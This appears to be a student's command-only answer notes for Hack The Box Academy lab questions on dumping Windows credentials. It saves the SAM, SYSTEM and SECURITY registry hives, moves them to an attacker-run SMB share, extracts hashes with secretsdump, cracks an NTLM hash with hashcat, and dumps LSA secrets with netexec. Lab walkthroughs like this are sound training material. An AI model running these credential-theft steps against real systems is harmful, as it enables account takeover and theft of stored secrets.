## Where is the SAM database located in the Windows registry? (Format: ****\***)
```
hklm\sam
```

## Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

```
xfreerdp3 /v:10.129.1.42 /u:Bob /p:HTB_@cademy_stdnt! 

reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Documents/

move sam.save \\10.10.14.7\CompData
move security.save \\10.10.14.7\CompData
move system.save \\10.10.14.7\CompData

sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > hash.txt

hashcat -m 1000 'c02478537b9727d391bc80011c2e2321' /usr/share/wordlists/rockyou.txt
hashcat -m 1000 c02478537b9727d391bc80011c2e2321 --show
```


## Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)
```
netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

cat /home/kali/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-01-28_102930.secrets
```

